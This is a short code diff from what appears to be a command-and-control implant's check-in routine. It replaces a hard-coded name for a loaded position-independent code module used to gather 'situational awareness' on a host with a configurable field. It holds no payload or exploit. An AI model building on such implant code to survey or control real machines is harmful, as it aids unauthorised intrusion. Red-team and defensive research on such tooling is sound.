@@ -84,7 +84,7 @@ BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
 	ResolvedPico pico = { 0 };
-	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, "_builtin_checkin");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, state->builtin_picos.checkin);
 	if (result == FALSE) { return FALSE; }
 	
 	CHECKIN_PICO entrypoint = (CHECKIN_PICO) pico.entrypoint;
